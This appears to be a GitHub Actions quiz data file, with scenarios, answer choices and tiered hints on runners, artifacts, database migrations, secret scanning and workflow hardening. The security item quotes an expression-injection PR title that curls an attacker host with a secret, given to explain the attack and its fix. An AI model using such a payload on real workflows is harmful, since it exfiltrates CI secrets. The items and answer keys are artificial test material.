choices.text: Third-party SAST tool running in a Docker container with results uploaded as artifacts

CodeQL analysis workflow with: languages matrix (javascript, python, go), custom query packs for organization-specific patterns, SARIF upload for PR annotations and Security tab integration, and scheduled weekly full-repository scans for comprehensive coverage
ESLint and pylint in CI with security-focused rule sets only
Manual code review focused on security patterns by the security team

hints.label: Brief Hint
hints.content: CodeQL provides semantic code analysis (not just pattern matching), custom query support, native PR annotations, and Security tab tracking — purpose-built for this scenario.

hints.label: Complete Explanation
hints.content: CodeQL workflow with language matrix: [javascript, python, go] runs analysis for each language. Custom query packs (.ql files in the repository or a shared query pack) detect organization-specific patterns like PII logging — extending CodeQL's 2000+ built-in queries. Results upload as SARIF (Static Analysis Results Interchange Format), which GitHub displays as: PR annotations on specific code lines (inline review experience), entries in the Security tab > Code scanning alerts (with alert lifecycle tracking), and dismissal/resolution tracking over time. Scheduled weekly scans (schedule trigger) catch vulnerabilities in code paths not touched by recent PRs.

hints.label: Deep Knowledge
hints.content:
• CodeQL is semantic analysis: understands data flow, taint tracking, and control flow — not just regex pattern matching.
  • Custom queries: written in QL (a logic programming language), can detect complex patterns like "data flows from user input to SQL query without sanitization."
  • Query packs: shareable bundles of .ql files distributed via GitHub Packages — organization-wide custom rule distribution.
  • SARIF upload: any SAST tool outputting SARIF format can integrate with GitHub's Security tab — not limited to CodeQL.

questions.title: Larger Runners and Hardware Selection
questions.scenario: A game development team's CI builds large C++ projects (30 minutes on standard 2-core runners). They also need GPU-accelerated tests for their rendering engine and ARM builds for mobile platforms. Budget is limited — they want to use larger runners only for jobs that benefit from more resources, not for simple linting or documentation builds.
questions.questionText: Which runner strategy optimizes cost while providing specialized hardware where needed?

choices.text: Use the largest available runner for all jobs to minimize total build time

Standard runners (ubuntu-latest) for lint and docs jobs, GitHub-hosted larger runners (ubuntu-latest-16-cores) for C++ compilation, self-hosted GPU runners for rendering tests, and self-hosted ARM runners (or ARM-based larger runners) for mobile builds — each job specifies runs-on: matching its resource needs
A single self-hosted runner with GPU and many cores handling all job types
Split the C++ build into 30 parallel jobs on standard runners

hints.label: Brief Hint
hints.content: Match runner resources to job requirements: standard for light jobs, larger runners for compilation, specialized hardware (GPU, ARM) for specific needs.

hints.label: Complete Explanation
hints.content: runs-on: per job selects the appropriate runner: ubuntu-latest (2-core, free tier) for linting and docs (fast, cheap). ubuntu-latest-16-cores (GitHub-hosted larger runner) for C++ compilation — 8x cores reduces 30 minutes to ~5 minutes, and the higher per-minute cost is offset by 6x fewer minutes. Self-hosted runners with GPUs for rendering tests (GitHub-hosted runners don't have GPUs). Self-hosted ARM runners or GitHub's ARM larger runners (ubuntu-latest-arm64) for mobile builds. Each job gets exactly the resources it needs — no waste on standard jobs, no bottlenecks on intensive jobs.

hints.label: Deep Knowledge
hints.content:
• Larger runner pricing: 2-core = 1x, 4-core = 2x, 8-core = 4x, 16-core = 8x, 32-core = 16x, 64-core = 32x per minute.
  • Cost optimization: if 16-core finishes in 1/8 the time of 2-core, cost is the same — but wall-clock time is 8x faster.
  • GPU runners: not available as GitHub-hosted — must be self-hosted (on-premises or cloud instances with GPUs attached).
  • ARM runners: GitHub offers ubuntu-latest-arm64 as larger runners — useful for building ARM-native binaries without cross-compilation.

questions.title: Workflow Artifacts and Retention
questions.scenario: A CI pipeline produces: build artifacts (compiled binaries, 500MB, needed for deployment), test reports (JUnit XML + HTML coverage, 50MB, useful for PR review), and debug logs (full build trace, 2GB, only needed if the build fails). The team wants to minimize storage costs while keeping necessary artifacts available. Deployed artifacts must be retained for 90 days for compliance. Test reports should be visible in PR checks. Debug logs should only be uploaded on failure.
questions.questionText: Which artifact strategy balances retention, visibility, and cost?

choices.text: Upload all artifacts with default 90-day retention regardless of type
Store all artifacts in an external S3 bucket instead of GitHub Artifacts
Don't upload any artifacts — rebuild from source when needed

Build artifacts: upload with retention-days: 90 for compliance. Test reports: upload with retention-days: 7 and use dorny/test-reporter for PR check annotation. Debug logs: upload with if: failure() and retention-days: 3 (only needed for failure investigation). Total: only necessary artifacts stored for minimum required durations.

hints.label: Brief Hint
hints.content: Different artifacts have different retention needs — use retention-days to minimize storage, if: failure() for conditional upload, and test reporters for PR integration.

hints.label: Complete Explanation
hints.content: Tiered artifact strategy: Build artifacts (500MB) with retention-days: 90 satisfies compliance — these are needed for deployment rollback and audit. Test reports (50MB) with retention-days: 7 provides a week to review PR results; dorny/test-reporter or EnricoMi/publish-unit-test-result-action parses JUnit XML and creates a PR check with inline test results and annotations. Debug logs (2GB) with if: failure() only upload when the build fails — saving 90% of the time this would be stored (only 1 in 10 runs fail). retention-days: 3 gives enough time to investigate before auto-cleanup. This minimizes the storage cost (GitHub charges for artifact storage above the free tier) while maintaining all necessary functionality.

hints.label: Deep Knowledge
hints.content:
• Storage limits: GitHub Free = 500MB, Pro = 1GB, Team = 2GB, Enterprise = 50GB of artifact storage included.
  • retention-days: 1-90; organization admins can set maximum retention period that overrides higher values in workflows.
  • Test reporter actions: parse JUnit/NUnit/xUnit XML and create GitHub Checks with per-test pass/fail annotations on the PR.
  • Artifact v4 (actions/upload-artifact@v4): immutable artifacts, faster uploads, and support for multiple uploads to the same artifact name (merged).

questions.title: Database Migration in CI/CD
questions.scenario: A web application uses PostgreSQL with schema migrations managed by Flyway. The CI/CD pipeline must: validate migration scripts syntax on PR (without running against production), test migrations against a fresh database in CI (ensure they apply cleanly), apply migrations to staging before application deployment, and apply to production with a backup taken first and rollback capability if the application fails health checks after migration.
questions.questionText: Which CI/CD pipeline handles database migrations safely across environments?

choices.text: Apply migrations manually via SSH before each deployment

PR: Flyway validate (syntax check only). CI: service container (postgres) with Flyway migrate + application integration tests. Staging job: Flyway migrate against staging DB then deploy app. Production job: pg_dump backup step, Flyway migrate, deploy app, health check — if health check fails, Flyway undo (or restore from backup) and rollback app deployment.
Run all migrations in production directly on merge without testing
Use ORM auto-migration in the application startup — no explicit migration management

hints.label: Brief Hint
hints.content: Layer migration safety: validate in PR, test in CI with ephemeral DB, apply to staging first, then production with backup and rollback capability.

hints.label: Complete Explanation
hints.content: The pipeline layers safety: PR workflow runs Flyway validate (checks SQL syntax and naming conventions without connecting to a real database). CI workflow uses a PostgreSQL service container (services: postgres: image: postgres:15) where Flyway migrate applies all migrations from scratch — proving they apply cleanly to an empty database, then runs integration tests. Staging deployment job runs Flyway migrate against the staging database, then deploys the application (tests the migration with real data patterns). Production deployment job: pg_dump creates a backup, Flyway migrate applies changes, app deploys, health check validates. If health check fails: restore the backup (psql < backup.sql) and roll back the application to the previous version.

hints.label: Deep Knowledge
hints.content:
• Service containers: containers running alongside the job (services: key in YAML) — accessible via localhost or service name.
  • Flyway validate: checks migration file checksums, naming format, and SQL syntax without applying — fast, no DB needed (or uses a temp DB).
  • pg_dump before migration: provides point-in-time recovery if migration succeeds but application is incompatible with new schema.
  • Forward-only migrations: if Flyway undo is not available, the backup/restore approach is the safe rollback path.

questions.title: GitHub Script Action
questions.scenario: A workflow needs to: query the GitHub API to find all open PRs with the "ready-for-review" label, add a comment to each PR with today's build status, remove the label after commenting, and create a summary issue listing all PRs that were processed. This requires multiple API calls with error handling and state management between calls.
questions.questionText: Which approach provides rich GitHub API interaction within a workflow step?

choices.text: Multiple curl commands with GITHUB_TOKEN in Authorization headers and jq for JSON parsing
A separate GitHub App with a webhook server processing events

actions/github-script with inline JavaScript — provides an authenticated octokit client (github.rest.*), access to context (context.repo, context.payload), and full Node.js for logic, error handling, and iteration over API results
GitHub CLI (gh) commands in a shell script step for each operation

hints.label: Brief Hint
hints.content: actions/github-script provides an authenticated Octokit client with full JavaScript — ideal for complex multi-step API interactions within a workflow.

hints.label: Complete Explanation
hints.content: actions/github-script runs inline JavaScript with pre-authenticated clients: github.rest.pulls.list() to query PRs with label filter, github.rest.issues.createComment() to add comments, github.rest.issues.removeLabel() to remove labels, and github.rest.issues.create() for the summary issue. The JavaScript environment supports: async/await for sequential API calls, try/catch for error handling, variables for state management between calls, loops for iterating over PR lists, and template literals for building comment bodies. The octokit client is pre-authenticated with GITHUB_TOKEN — no manual auth header management. This is far more maintainable than curl + jq for complex multi-step API workflows.

hints.label: Deep Knowledge
hints.content:
• github-script context: github (octokit client), context (event payload, repo info), core (setOutput, setFailed), io, exec — full toolkit access.
  • Pagination: github.paginate(github.rest.pulls.list, {...}) automatically handles multi-page API responses.
  • Return values: the script's return value becomes the step's output, accessible via steps.{id}.outputs.result.
  • Authentication: uses GITHUB_TOKEN by default; can pass a PAT via with: github-token for cross-repo operations.

questions.title: Secrets Scanning and Prevention
questions.scenario: A developer accidentally committed an AWS access key to a public repository. The security team needs: automatic detection of committed secrets (API keys, tokens, passwords), prevention of secrets from being pushed in the first place (pre-receive hook equivalent), notification to the security team when secrets are detected, and automatic revocation of exposed credentials where possible.
questions.questionText: Which GitHub features provide comprehensive secret leak detection, prevention, and response?

choices.text: Manual code review focused on credential patterns in every PR
Pre-commit hooks on developer machines scanning for patterns before commit

GitHub Secret Scanning (detects 200+ credential patterns in pushed code and alerts repo admins), Push Protection (blocks pushes containing detected secrets before they reach the repository), partner program (auto-revokes exposed tokens via provider notification to AWS/Azure/etc.), and security alerts routed to the security team via organization audit log streaming
Repository settings preventing pushes to main — secrets can still be pushed to feature branches

hints.label: Brief Hint
hints.content: Secret scanning detects after push, push protection blocks before landing, partner program auto-revokes exposed tokens — comprehensive leak lifecycle management.

hints.label: Complete Explanation
hints.content: GitHub Secret Scanning automatically scans all pushes for 200+ credential patterns (AWS keys, GitHub tokens, database connection strings, etc.) and creates alerts in the Security tab. Push Protection (enabled per-repository or organization-wide) blocks the push entirely if a secret is detected — the developer sees an error message explaining what was detected and how to fix it. The partner program automatically notifies credential providers (AWS, Azure, Stripe, etc.) who revoke the exposed credential — limiting the window of exploitation. Security alerts from secret scanning can be routed to the security team via webhooks, audit log streaming, or notification settings. This covers prevention, detection, and response.

hints.label: Deep Knowledge
hints.content:
• Push protection bypass: developers can mark as false positive, used in tests, or will fix later — all bypasses are logged and visible to admins.
  • Partner program: 100+ partners including AWS, Azure, GCP, npm, PyPI, Slack — tokens are auto-revoked within minutes of exposure.
  • Custom patterns: organization admins can define custom secret patterns (regex) for internal credential formats not covered by built-in detection.
  • Secret scanning for non-provider patterns: detects generic patterns like passwords in connection strings and private keys — broader than just API keys.

questions.title: Workflow Observability
questions.scenario: An organization runs 5,000 workflow runs per day. The platform team needs: aggregate metrics (success rate, average duration, failure trends over time), per-workflow performance tracking (which workflows are getting slower), flaky test detection (tests that pass/fail intermittently), and alerting when a critical workflow's success rate drops below 95% for an hour.
questions.questionText: Which observability approach provides comprehensive workflow health monitoring?

choices.text: Check each workflow run manually in the GitHub UI

GitHub Actions usage metrics API for raw data, exported to a time-series database (Prometheus/Datadog/CloudWatch), with dashboards showing success rates, duration trends, and failure patterns per workflow, plus alerting rules on success rate thresholds — supplemented by flaky test detection from test result annotations over time
GitHub organization insights page for high-level overview only
A weekly email report summarizing workflow runs from the previous week

hints.label: Brief Hint
hints.content: Export workflow run data to an observability platform for time-series analysis, dashboards, and threshold-based alerting — GitHub's UI alone cannot provide aggregate trends at scale.

hints.label: Complete Explanation
hints.content: At 5,000 runs/day, aggregate observability requires exporting data: GitHub REST API (GET /repos/{owner}/{repo}/actions/runs) provides run status, duration, and conclusion for each workflow. A scheduled workflow or external service polls this data and writes to a time-series database. Dashboards show: success rate per workflow over time (spot degradation), duration trends (detect slowdowns), and failure correlation (multiple workflows failing = infrastructure issue). Alerting rules fire when success rate < 95% for 1 hour. For flaky tests: aggregate JUnit test results over multiple runs — tests that alternate pass/fail are flagged as flaky. This provides the complete observability stack for CI/CD health.

hints.label: Deep Knowledge
hints.content:
• GitHub webhook: workflow_run event fires on completion — push-based data collection without polling (lower latency, no rate limits).
  • Datadog GitHub Integration: pre-built dashboards for Actions metrics — out-of-box success rates, duration percentiles, and queue times.
  • Flaky test detection: track test outcomes over N runs — tests failing 20-80% of the time without code changes are flaky.
  • Job-level metrics: /actions/runs/{id}/jobs provides per-job timing — identifies which specific job is causing workflow slowdowns.

questions.title: Dynamic Workflow Generation
questions.scenario: A platform team needs a workflow that discovers all services in a monorepo (each service has a service.yml manifest), reads each service's configuration (language, test command, deployment target), and dynamically generates a test matrix based on discovered services. New services should be automatically included in CI without modifying the workflow file. The number of services changes frequently (currently 12, growing to 30+).
questions.questionText: Which technique enables dynamic, discovery-based workflow execution?

choices.text: Hardcode all 12 services in the matrix and update manually when new services are added
A separate workflow file per service maintained by each service team

A discover job that scans the repository for service.yml files, outputs a JSON array of service configurations, followed by a test job with matrix: ${{ fromJSON(needs.discover.outputs.services) }} — dynamically creating one matrix job per discovered service with service-specific parameters
A script that generates workflow YAML files and commits them to .github/workflows/

hints.label: Brief Hint
hints.content: fromJSON() in matrix expressions enables dynamic matrices — a discovery job outputs a JSON array that becomes the matrix at runtime.

hints.label: Complete Explanation
hints.content: The discover job scans the repository (find */service.yml, parse each with yq/jq) and constructs a JSON array of objects: [{name: "auth", language: "go", test_cmd: "go test ./..."}, {name: "api", language: "node", test_cmd: "npm test"}, ...]. This array is set as a job output. The test job uses strategy: matrix: service: ${{ fromJSON(needs.discover.outputs.services) }} — GitHub Actions creates one matrix instance per array element. Each instance accesses matrix.service.name, matrix.service.language, etc. When a new service is added (with its service.yml), it's automatically discovered on the next run — zero workflow modifications needed. This scales from 12 to 30+ services without workflow changes.

hints.label: Deep Knowledge
hints.content:
• fromJSON(): parses a JSON string into a GitHub Actions expression value — works in matrix: for dynamic generation.
  • Matrix from output: needs.discover.outputs.services must be a valid JSON array string (use jq -c for compact JSON).
  • Matrix limit: 256 jobs maximum per matrix — sufficient for 30+ services with headroom.
  • Caching: the discover job is fast (file scan) and enables highly parallel subsequent jobs — optimal for monorepo CI.

questions.title: Pull Request Automation
questions.scenario: A team wants automated PR management: auto-assign reviewers based on changed files (frontend changes → frontend team, backend → backend team), add labels based on file paths (bug-fix, feature, documentation), post a size warning if the PR exceeds 500 lines changed, auto-merge PRs from Dependabot that pass CI (trusted dependency updates), and close stale PRs that have been inactive for 30 days with a warning comment at 14 days.
questions.questionText: Which combination of GitHub features and actions implements comprehensive PR automation?

choices.text: Manual PR management by a designated team lead
A single custom GitHub App handling all PR events

CODEOWNERS file for reviewer assignment, actions/labeler for path-based labeling, a size-check step using github-script for line count warning, dependabot auto-merge configuration with auto-merge enabled on passing checks, and actions/stale for inactive PR management with 14-day warning and 30-day close
Branch protection rules with required reviewers for all automation needs

hints.label: Brief Hint
hints.content: Each requirement maps to a specific GitHub feature or action: CODEOWNERS, labeler, github-script, auto-merge, and stale — combine for comprehensive PR automation.

hints.label: Complete Explanation
hints.content: CODEOWNERS file (.github/CODEOWNERS) maps file patterns to teams: /frontend/** @org/frontend-team, /backend/** @org/backend-team — GitHub automatically requests reviews from matching teams. actions/labeler adds labels based on a configuration mapping file paths to labels. A PR workflow step uses github-script to check context.payload.pull_request.additions + deletions, posting a comment if >500 lines. Dependabot auto-merge: configure dependabot.yml with open-pull-requests-limit and use gh pr merge --auto in a workflow triggered on dependabot PRs that pass CI. actions/stale identifies inactive PRs, comments at 14 days ("This PR has been inactive..."), and closes at 30 days. Each tool handles one concern cleanly.

hints.label: Deep Knowledge
hints.content:
• CODEOWNERS: requires branch protection "Require review from Code Owners" to be enforceable — otherwise it's just a suggestion.
  • actions/labeler: .github/labeler.yml defines rules like "frontend: ['frontend/**']" — labels applied on PR open and synchronize.
  • Auto-merge: repository setting must be enabled; then PRs with auto-merge set merge automatically when all required checks pass and reviews are approved.
  • actions/stale: configurable days-before-stale, days-before-close, exempt-labels (e.g., "in-progress" PRs are never marked stale).

questions.title: Action Testing and CI
questions.scenario: A team maintains a widely-used composite action. They need: unit tests for the action's logic (input validation, output generation), integration tests that verify the action works correctly within a real workflow, testing across runner OS types (Ubuntu, Windows, macOS), and automated release creation when tests pass on the main branch. The action itself needs CI just like any other codebase.
questions.questionText: Which testing strategy provides comprehensive quality assurance for a GitHub Action?

choices.text: Test the action manually by running it in a test repository before each release
Only test in consumer repositories after release — fix issues in patch releases

CI workflow in the action's repository: unit tests (Jest for JS actions, or script-based for composite), integration test workflow that calls the action locally (uses: ./) with known inputs and asserts expected outputs, matrix strategy testing on [ubuntu-latest, windows-latest, macos-latest], and automated release workflow triggered on main branch push after all tests pass
Code review only without automated testing

hints.label: Brief Hint
hints.content: Actions need CI too: unit tests for logic, integration tests using uses: ./ (self-referencing), cross-OS matrix, and automated release on green.

hints.label: Complete Explanation
hints.content: The action's own CI workflow tests it thoroughly: Unit tests (Jest for JavaScript actions) test individual functions (input parsing, output formatting, API call logic) with mocked dependencies. Integration tests use uses: ./ (references the action from the current repository checkout) with known inputs, then assert outputs match expected values using if: steps.test.outputs.result != 'expected'. Matrix strategy runs both unit and integration tests on all three OS types. The release workflow: triggered on push to main, after all tests pass, creates a GitHub Release with semantic version tag (from conventional commits or manual version bump) — ensuring only tested code is released. This is the same quality bar as any production codebase.

hints.label: Deep Knowledge
hints.content:
• uses: ./ references the action from the repository root of the current checkout — enables testing the action in the same CI that develops it.
  • For JavaScript actions: mock @actions/core and @actions/github in Jest tests — test logic without GitHub API side effects.
  • Output assertion: steps.test-action.outputs.my_output in subsequent step's if: condition validates the action produced correct outputs.
  • act (nektos/act): local GitHub Actions runner emulator — enables running workflow tests on developer machines before pushing.

questions.title: Workflow Security Hardening
questions.scenario: A public repository accepts contributions from external developers via PRs. Security concerns: PR workflows triggered by pull_request_target have write permissions and access to secrets (unlike pull_request), malicious PRs could modify workflow files to exfiltrate secrets, and expression injection via crafted PR titles or branch names containing ${{ }} syntax could execute arbitrary commands.
questions.questionText: Which security measures protect against these workflow exploitation vectors?

choices.text: Disable all CI for external PRs

Use pull_request (not pull_request_target) for untrusted code execution, never use PR-controlled data (title, body, branch name) directly in run: expressions without sanitization, pin all actions to SHA, and if pull_request_target is needed, only checkout the base branch (not the PR head) for any code that runs with elevated permissions
Trust all contributors since the repository is public
Require all external contributors to sign a CLA before their PRs trigger workflows

hints.label: Brief Hint
hints.content: Never run untrusted code with elevated permissions, never interpolate user-controlled strings into run: expressions, and keep secrets away from fork PRs.

hints.label: Complete Explanation
hints.content: pull_request trigger runs with read-only permissions and no secrets access for fork PRs — safe for untrusted code. pull_request_target runs in the context of the base branch (write access, secrets available) — NEVER checkout the PR head ref when using this trigger (a malicious PR could modify the checked-out code). Expression injection: if a PR title contains ${{ github.event.pull_request.title }} in a run: step, it's interpolated before shell execution — crafted titles like "; curl attacker.com?s=$SECRET;" execute arbitrary commands. Mitigation: assign to an environment variable first (env: TITLE: ${{ ... }}) and reference $TITLE in the script. SHA pinning prevents compromised action tags from injecting code.

hints.label: Deep Knowledge
hints.content:
• Expression injection: ${{ }} is evaluated by Actions BEFORE the shell sees the command — it's template injection, not shell injection.
  • Safe pattern: env: PR_TITLE: ${{ github.event.pull_request.title }} then run: echo "$PR_TITLE" — the env var is properly quoted by the shell.
  • pull_request_target + checkout PR head = giving write access + secrets to attacker-controlled code — critical vulnerability.
  • Workflow approval for first-time contributors: organization setting requiring manual approval before workflows run for new contributors.

questions.title: GitHub Actions for GitHub Enterprise
questions.scenario: A company uses GitHub Enterprise Server (GHES) on-premises. They want to use GitHub Actions but have restrictions: no internet access from the build environment (air-gapped network), need to host action code internally (cannot pull from github.com), must use self-hosted runners on their own infrastructure, and want to mirror commonly-used actions from github.com for internal use.
questions.questionText: Which configuration enables GitHub Actions in an air-gapped GHES environment?

choices.text: Connect GHES to github.com via a proxy for action downloads
Disable Actions entirely and use Jenkins for CI/CD
Use GitHub.com hosted runners that VPN back to the enterprise network

Self-hosted runners on internal infrastructure, actions-sync tool to mirror actions from github.com to the internal GHES instance, internal action repositories for custom actions, and pre-cached tool versions on runners (since setup-* actions cannot download from internet)

hints.label: Brief Hint
hints.content: Air-gapped GHES: self-hosted runners (no hosted runners available), mirrored actions (no github.com access), and pre-cached tools (no internet downloads).

hints.label: Complete Explanation
hints.content: In an air-gapped GHES deployment: Self-hosted runners are the only option (GitHub-hosted runners are a github.com service). The actions-sync tool (github.com/actions/actions-sync) mirrors popular actions (actions/checkout, actions/cache, setup-node, etc.) from github.com to the internal GHES instance — workflows reference the internal mirror. Custom actions live in internal repositories on the GHES instance. Tool caches (Node.js, Python, Go binaries) must be pre-populated on runners or in an internal mirror since setup-* actions normally download from the internet. Runner images are built with all required tools pre-installed, eliminating runtime internet dependency.

hints.label: Deep Knowledge
hints.content:
• actions-sync: CLI tool that clones action repos from github.com and pushes to GHES — handles both code and releases/tags.
  • Tool cache: RUNNER_TOOL_CACHE directory pre-populated with Node.js, Python, etc. — setup-* actions check here before downloading.
  • GHES Actions: requires blob storage (Azure Blob, S3, or MinIO) for workflow logs and artifacts.
  • Internal action marketplace: GHES supports an internal actions browsing experience — users discover internal actions within the enterprise.

questions.title: Composite Workflow Patterns
questions.scenario: A complex CI/CD pipeline needs coordination between multiple workflows: a build workflow that produces artifacts, a security scan workflow that analyzes the artifacts, a deploy workflow that uses scan-approved artifacts, and a notification workflow that reports the outcome of the entire pipeline. Each workflow has different triggers and may need to wait for others.
questions.questionText: Which pattern coordinates multiple dependent workflows into a pipeline?

choices.text: All logic in a single massive workflow file
Cron schedules aligned so workflows run in the correct order by timing

workflow_run trigger chaining: build triggers on push, security-scan triggers on workflow_run (workflow: build, types: completed, conclusion: success), deploy triggers on workflow_run (workflow: security-scan, conclusion: success) with environment approval gate, and notify triggers on workflow_run (workflow: deploy) for both success and failure outcomes — passing artifacts between workflows via the triggering workflow's artifacts
Manual triggering of each workflow in sequence by a release manager

hints.label: Brief Hint
hints.content: workflow_run trigger creates event-driven chains between workflows — each workflow runs when its predecessor completes with the expected conclusion.

hints.label: Complete Explanation
hints.content: workflow_run enables workflow chaining: the security-scan workflow triggers when the build workflow completes successfully (on: workflow_run: workflows: ["Build"], types: [completed], filtering on conclusion via if: github.event.workflow_run.conclusion == 'success'). The deploy workflow similarly triggers after security-scan succeeds. Artifacts from the triggering workflow are accessible via the workflow_run event (github.event.workflow_run.id allows downloading artifacts from the parent run). The notification workflow triggers on both success and failure of deploy to report either outcome. This creates a DAG of workflows without coupling them into a single file — each is independently maintainable, testable, and has clear responsibility boundaries.

hints.label: Deep Knowledge
hints.content:
• workflow_run only triggers for workflows on the default branch — feature branch workflows don't trigger the chain.
  • Artifact access: use actions/download-artifact@v4 with github-token and run-id from github.event.workflow_run.id for cross-workflow artifact sharing.
  • Conclusion filter: check github.event.workflow_run.conclusion in an if: condition — values: success, failure, cancelled, skipped.
  • Limitation: workflow_run adds seconds of delay between workflows (event processing time) — not suitable for sub-second coordination.

questions.title: Multi-Cloud Deployment
questions.scenario: A SaaS product deploys to both AWS (primary) and GCP (disaster recovery). The deployment workflow must: build once (single container image), push to both ECR (AWS) and Artifact Registry (GCP), deploy to EKS (AWS) and GKE (GCP) with environment-specific configurations, and verify health in both clouds before marking the deployment as complete. Authentication must use OIDC for both clouds (no stored credentials).
questions.questionText: Which workflow architecture deploys to both clouds with OIDC authentication?

choices.text: Two completely separate workflows — one per cloud — triggered independently
Deploy to AWS first, then replicate the entire deployment to GCP using a migration tool

Single workflow: build job (produces image), parallel deploy jobs (deploy-aws and deploy-gcp) each with OIDC authentication to their respective cloud (separate IAM role/workload identity configurations), push image to both registries, apply Kubernetes manifests to both clusters, and a final health-check job that verifies both deployments (needs: [deploy-aws, deploy-gcp])
Use a multi-cloud deployment platform (Spinnaker) triggered by the workflow

hints.label: Brief Hint
hints.content: Build once, deploy to both clouds in parallel with separate OIDC credentials, then verify both — single workflow with cloud-specific jobs.

hints.label: Complete Explanation
hints.content: Single workflow provides coordination: The build job creates one container image. Two parallel deploy jobs (needs: [build]) authenticate independently: deploy-aws uses aws-actions/configure-aws-credentials with OIDC (role-to-assume), deploy-gcp uses google-github-actions/auth with workload_identity_provider. Each pushes the same image to their respective registry (ECR/Artifact Registry) and applies environment-specific Kubernetes manifests (different configs per cloud via kustomize overlays or Helm values). A health-check job (needs: [deploy-aws, deploy-gcp]) verifies both deployments are healthy before marking the workflow as successful. OIDC for both means zero stored cloud credentials.

hints.label: Deep Knowledge
hints.content:
• OIDC for GCP: google-github-actions/auth with workload_identity_provider and service_account — maps GitHub identity to GCP service account.
  • Image retagging: build once (ghcr.io/org/app:sha), then tag+push to ECR and Artifact Registry — avoids building twice.
  • Kubernetes config per cloud: Helm values files (values-aws.yaml, values-gcp.yaml) or kustomize overlays handle cloud-specific settings.
  • Parallel deploys: both clouds deploy simultaneously (no needs: between them) — total deployment time = max(aws_time, gcp_time), not sum.

questions.title: GitHub Packages Integration
questions.scenario: A team publishes multiple npm packages from a monorepo. Their workflow needs to: determine which packages changed since the last release, version each changed package independently (following conventional commits), publish changed packages to GitHub Packages (npm registry), and ensure package consumers can install both public and organization-private packages from the same scope.
questions.questionText: Which workflow handles independent package versioning and publishing from a monorepo?

choices.text: Publish all packages on every merge regardless of changes
Manual version bumping in each package.json before merge

Changesets or Lerna-based workflow: detect changed packages, determine version bumps per-package from commit messages, publish only changed packages to GitHub Packages npm registry (registry-url: https://npm.pkg.github.com) using GITHUB_TOKEN, with package.json publishConfig pointing to GitHub Packages scope
Publish to npmjs.com only — GitHub Packages not used

hints.label: Brief Hint
hints.content: Changesets/Lerna handle per-package versioning in monorepos; GitHub Packages npm registry provides scoped package hosting authenticated via GITHUB_TOKEN.

hints.label: Complete Explanation
hints.content: Changesets (or Lerna) manage independent package versioning in monorepos: each PR includes a changeset file describing what changed and the version bump type. On merge to main, the workflow: consumes changesets to determine which packages need new versions, bumps package.json versions independently, generates per-package changelogs, and runs npm publish for each changed package. Publishing to GitHub Packages (registry-url: https://npm.pkg.github.com in setup-node) uses GITHUB_TOKEN for authentication — no additional secrets needed for same-organization packages. Package consumers add the scope to their .npmrc: @org:registry=https://npm.pkg.github.com. Private packages are accessible to organization members; public packages are accessible to anyone.

hints.label: Deep Knowledge
hints.content:
• GitHub Packages npm: packages are scoped to the repository owner (@org/package-name). GITHUB_TOKEN has packages:write for publishing.
  • Changesets: PR-based workflow — developers add changesets during PR, a "Version Packages" PR is auto-created, merging it triggers publish.
  • Consumer auth: .npmrc with //npm.pkg.github.com/:_authToken=${GITHUB_TOKEN} for CI consumers; PAT for local development.
  • Mixed registries: packages can install from both npmjs.com (default) and GitHub Packages (scoped) simultaneously via .npmrc configuration.

questions.title: Environment Deployment Protection Rules
questions.scenario: A compliance-regulated company needs deployment gates beyond simple reviewer approval: deployments to production must only occur during business hours (9 AM - 5 PM weekdays), a third-party change management system (ServiceNow) must have an approved change request, and the deployment must pass an external security validation API before proceeding. Standard GitHub environment protection rules (reviewers, wait timer) are insufficient.
questions.questionText: Which feature extends environment protection beyond built-in rules?

choices.text: Custom deployment protection rules — GitHub Apps that implement the deployment protection rule API, receiving callbacks before deployments proceed and responding with approve/reject based on external validation (business hours check, ServiceNow approval status, security API result)
Branch protection rules with additional checks
A manual checklist in the PR description that reviewers must verify
A pre-deployment workflow that checks conditions and fails if not met

hints.label: Brief Hint
hints.content: Custom deployment protection rules allow GitHub Apps to gate deployments based on arbitrary external conditions — extending beyond built-in reviewers and timers.

hints.label: Complete Explanation
hints.content: Custom deployment protection rules are implemented as GitHub Apps that register as deployment protection rule providers. When a workflow job references a protected environment, GitHub calls each registered protection rule App's webhook endpoint with the deployment details. The App evaluates its custom logic (check current time for business hours, query ServiceNow API for approved change request, call security validation API) and responds with approved or rejected status plus a message. All registered rules must approve before the deployment job proceeds. This enables arbitrary external gates: change management systems, security tools, compliance checks, and time-based restrictions — all integrated into GitHub's native deployment flow.

hints.label: Deep Knowledge
hints.content:
• Custom deployment protection rules: GitHub App receives deployment_protection_rule webhook, responds via POST /repos/.../actions/runs/.../deployment_protection_rule.
  • Multiple rules: an environment can have multiple custom rules — ALL must approve (logical AND). Combined with built-in rules (reviewers + timer).
  • Timeout: custom rules have a maximum response time (default 30 minutes) — if no response, the deployment is rejected.
  • Use cases: ServiceNow integration, PagerDuty incident check (don't deploy during outage), feature flag validation, regulatory compliance checks.

questions.title: Workflow Templates and Starter Workflows
questions.scenario: An organization wants to provide standardized workflow starting points for common project types: Node.js web apps, Python data science projects, Go microservices, and mobile apps. When developers create a new repository or click "New workflow," they should see organization-specific templates pre-configured with the team's tooling (specific linting rules, required security scans, internal artifact registries). Templates should be maintainable centrally but customizable per repository.
questions.questionText: Which mechanism provides organization-level workflow templates discoverable by all repositories?

choices.text: A wiki page with copy-paste workflow snippets
Template repositories that developers fork when starting new projects

Starter workflows in the organization's .github repository: workflow templates in .github/workflow-templates/ with companion properties.json files defining name, description, icon, categories, and file patterns for auto-suggestion — visible to all repos in the "Actions" tab "New workflow" page
Required workflows that enforce a single workflow on all repositories regardless of type

hints.label: Brief Hint
hints.content: Starter workflows in .github/workflow-templates/ appear as templates when any org repository creates a new workflow — discoverable and customizable.

hints.label: Complete Explanation
hints.content: The organization's .github repository contains .github/workflow-templates/ directory with: workflow YAML files (node-ci.yml, python-ci.yml, go-ci.yml, mobile-ci.yml) pre-configured with internal tooling, and companion .properties.json files specifying: name, description, iconName, categories (["Node.js", "CI"]), and filePatterns (["package.json"] for auto-suggestion when a repo contains that file). When developers in any org repo click "Actions" → "New workflow," they see these templates alongside GitHub's built-in suggestions. Selecting one creates a copy in the repository that developers can customize. The template serves as a starting point — not enforced, but strongly suggested with best practices baked in.

hints.label: Deep Knowledge
hints.content:
• filePatterns: if a repo contains a matching file (e.g., package.json), that template is suggested first — intelligent auto-suggestion.
  • $default-branch variable: use in templates for branch references — replaced with the repo's actual default branch on adoption.
  • Distinction: starter workflows are voluntary templates; required workflows (via rulesets) are mandatory injected jobs — different governance levels.
